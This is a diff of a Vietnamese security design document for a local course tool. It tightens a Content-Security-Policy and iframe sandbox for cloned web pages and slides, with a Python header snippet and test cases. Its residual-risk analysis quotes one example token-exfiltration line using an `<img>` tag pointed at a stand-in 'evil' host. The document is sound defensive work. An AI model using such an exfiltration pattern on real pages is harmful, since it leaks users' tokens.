@@ -24,7 +24,7 @@ CSP áp cho response `.html` có path bắt đầu `/my-course/` hoặc `/intro/
 
 ```
 default-src 'self';
-script-src 'self' 'unsafe-inline';
+script-src 'self' 'unsafe-inline' https:;
 style-src 'self' 'unsafe-inline' https:;
 img-src 'self' data: https:;
 font-src 'self' data: https:;
@@ -32,6 +32,8 @@ media-src 'self' data:;
 connect-src 'none';
 form-action 'none';
 base-uri 'none';
+object-src 'none';
+frame-src 'self' https:;
 frame-ancestors 'self'
 ```
 
@@ -39,30 +41,59 @@ Lý do từng nhát siết:
 
 - `connect-src 'none'` — chìa khoá: chặn fetch/XHR/WS/beacon/EventSource
   → trang độc không gọi được bridge, không gửi data đi đâu bằng JS.
-- `form-action 'none'` — clone hay có form giả; chặn submit phishing.
-- `base-uri 'none'` — chặn đổi base để hút tài nguyên về host lạ.
+  (Cũng chặn `link rel=preconnect/prefetch` — vô hại.)
+- `form-action 'none'` — clone có sẵn `<form>` (đã kiểm: mekongtouch);
+  chặn submit phishing.
+- `base-uri 'none'` + `object-src 'none'` — chặn đổi base và
+  `<object>/<embed>` legacy.
 - `unsafe-inline` ở script/style — **bắt buộc**: slide nav và clone
   scroll-reveal là script inline hợp lệ. Residual: `javascript:` URL và
   `on*=` inline vẫn chạy — nhưng không `connect-src` thì chỉ phá được
   DOM trong trang (deface), không leo quyền.
-- `img-src ... https:` — học viên chèn link ảnh ngoài qua editor.
-  Residual đã phân tích: `<img src="https://evil/?t="+token>` exfil
-  được token nhưng token vô dụng ngoài loopback (bridge chỉ
-  127.0.0.1 + Origin-check), chấp nhận để không phá tính năng.
+- `img-src ... https:` — clone THẬT đã có `src="http` + học viên chèn
+  link ảnh ngoài qua editor. Residual đã phân tích: `<img
+  src="https://evil/?t="+token>` exfil được token nhưng token vô dụng
+  ngoài loopback (bridge chỉ 127.0.0.1 + Origin-check), chấp nhận để
+  không phá tính năng.
 - `media-src 'self' data:` — `video.mp4` bài học.
-- `default-src 'self'` — frame/worker/child khác mặc định chặt.
+- `script-src ... https:` + `frame-src 'self' https:` — clone site thật
+  có thể nhúng script CDN (YouTube/Google Maps embed) hoặc `<iframe>`
+  ngoài; thiếu `frame-src` thì nó fallback về `default-src 'self'` →
+  embed hợp lệ chết oan. Cho `https:` không làm yếu mục tiêu: script
+  ngoài vẫn không gọi được bridge (`connect-src 'none'` gánh), rủi ro
+  chỉ là exfil qua `<img>`/embed — residual đã chấp nhận.
+- `frame-ancestors 'self'` — clone-view/portal (cùng :8080) iframe được;
+  trang lạ không nhúng được. Lưu ý nếu tương lai tách port thì phải
+  nới directive này.
 
 KHÔNG áp cho `/web/` (portal UI cần gọi bridge), `/site/` (trang landing
 của project, tự chủ), `/templates/`, `/tools/` — giữ blast radius nhỏ;
 nếu sau này muốn siết thêm thì mở rộng danh sách prefix.
 
+## Lớp thứ hai (rẻ, làm luôn): siết sandbox iframe slide
+
+Đã kiểm chứng: `intro/slides.html`, `lesson-*/slides.html`,
+`templates/slide-deck.html` **không dùng** `localStorage`/`fetch`/
+`parent`/link ngoài (grep = 0) → giảm sandbox còn đúng những gì cần:
+
+```diff
+- sandbox="allow-scripts allow-same-origin"
++ sandbox="allow-scripts"
+```
+
+Slide thành opaque origin → script chạy nhưng **bản thân nó cũng không
+đọc được token** kể cả nếu CSP sót — defense-in-depth độc lập với
+header CSP ở trên. KHÔNG đụng iframe của clone-view (edit cần
+same-origin) — chỗ đó CSP gánh.
+
 ## File động
 
 | File | Action | Việc |
 |---|---|---|
+| `web/app.js` | modify | `iframe()`: sandbox bỏ `allow-same-origin` |
 | `tools/serve.py` | modify | thêm CSP khi `send_head` serve `.html` thuộc prefix trên |
 | `tools/serve.ps1` | modify | parity — **giữ BOM** |
-| `tools/test-bridges.py` | modify | case 21–22 (CSP có/không có đúng chỗ) |
+| `tools/test-bridges.py` | modify | case 23–24 (CSP có/không có đúng chỗ) |
 | `docs/SECURITY.md` | modify | mô tả boundary mới + residual |
 | `docs/clone-pipeline.md` | modify | ghi ràng buộc: clone KHÔNG được phụ thuộc fetch/WS external |
 
@@ -72,11 +103,12 @@ Trong `send_head`, sau `send_response(200)` trước `end_headers()`:
 
 ```python
 CSP_PATHS = ("/my-course/", "/intro/")
-CSP = ("default-src 'self'; script-src 'self' 'unsafe-inline'; "
+CSP = ("default-src 'self'; script-src 'self' 'unsafe-inline' https:; "
        "style-src 'self' 'unsafe-inline' https:; "
        "img-src 'self' data: https:; font-src 'self' data: https:; "
        "media-src 'self' data:; connect-src 'none'; "
-       "form-action 'none'; base-uri 'none'; frame-ancestors 'self'")
+       "form-action 'none'; base-uri 'none'; object-src 'none'; "
+       "frame-src 'self' https:; frame-ancestors 'self'")
 
 raw_path = urllib.parse.urlparse(self.path).path
 if raw_path.startswith(CSP_PATHS) and raw_path.lower().endswith((".html", ".htm")):
@@ -90,10 +122,11 @@ if raw_path.startswith(CSP_PATHS) and raw_path.lower().endswith((".html", ".htm"
 
 | # | Case | Kỳ vọng |
 |---|------|---------|
-| 21 | `GET /my-course/manifest.json` → không CSP; `GET /<file .html trong my-course>` → có `connect-src 'none'` | đúng phạm vi |
-| 22 | `GET /web/index.html` | KHÔNG có CSP header |
-| 23 (tay) | mở clone-view → bấm Sửa → đổi chữ/ảnh → Lưu → mở lại | edit sống nguyên |
-| 24 (tay) | mở slide bài học → nút chuyển slide | script inline vẫn chạy |
+| 23 | `GET /my-course/manifest.json` → không CSP; `GET /<file .html trong my-course>` → có `connect-src 'none'` | đúng phạm vi |
+| 24 | `GET /web/index.html` | KHÔNG có CSP header |
+| (tay) | mở clone-view → bấm Sửa → đổi chữ/ảnh → Lưu → mở lại | edit sống nguyên |
+| (tay) | mở slide bài học → nút chuyển slide | script inline vẫn chạy |
+| (tay) | mở clone có `<iframe>`/`<script src=https>` ngoài (nếu có) | embed vẫn hiển thị |
 
 ## Verify chuỗi tấn công chết
 
